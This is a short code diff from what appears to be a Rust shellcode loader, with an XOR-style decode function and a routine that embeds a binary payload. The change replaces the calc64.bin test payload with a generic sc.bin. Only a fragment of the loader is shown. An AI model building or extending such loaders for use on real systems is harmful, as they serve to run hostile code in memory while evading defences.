@@ -24,7 +24,7 @@ fn xdec(data: Vec<u8>) -> Vec<u8> {
 
 fn load_payload() -> *mut c_void {
     unsafe {
-        let mut sc: Vec<u8> = include_bytes!("calc64.bin").to_vec().to_owned();
+        let mut sc: Vec<u8> = include_bytes!("sc.bin").to_vec().to_owned();
         let sc_len: usize = sc.len();
 
         println!("[*] Allocating memory for shellcode");
